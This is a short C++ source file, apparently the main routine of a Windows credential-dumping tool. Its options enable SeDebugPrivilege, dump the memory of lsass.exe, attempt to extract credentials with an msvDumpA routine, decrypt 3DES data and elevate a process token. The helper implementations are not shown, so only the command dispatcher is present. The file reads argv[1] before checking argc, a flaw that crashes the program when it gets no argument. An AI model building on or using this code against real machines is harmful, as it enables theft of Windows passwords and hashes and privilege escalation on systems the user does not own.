#include <Windows.h>
#include "mDumpMtdVirtual.h"
#include "SetPrivilege.h"
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <CkCrypt2.h>

using namespace std;
int msvDumpA();
bool SetPrivilege(LPCWSTR lpszPrivilege, BOOL bEnablePrivilege);
int Decrypt3DES();
int ElevateToken();

int main(int argc, char* argv[])
{
	
	string arg1(argv[1]);
	if (argc <= 1)
	{
		if (argv[0])
			cout << argv[0] << " <argument>" << " <optional arguments>" << '\n';

		exit(1);
	}
	if (arg1 == "-minidump")
	{
		SetPrivilege(L"SeDebugPrivilege", TRUE);
		DumpMtdVirt(L"lsass.exe"); //dumping lsass method "virtual"
	}
	if (arg1 == "-pmemdump")
	{
		printf("[!] Trying to get credentials...\n");
		msvDumpA();
	}
	if (arg1 == "-des")
	{
		Decrypt3DES();
	}
	if (arg1 == "-elevate") {
		SetPrivilege(L"SeDebugPrivilege", TRUE);
		ElevateToken();
	}
	return 0;
}

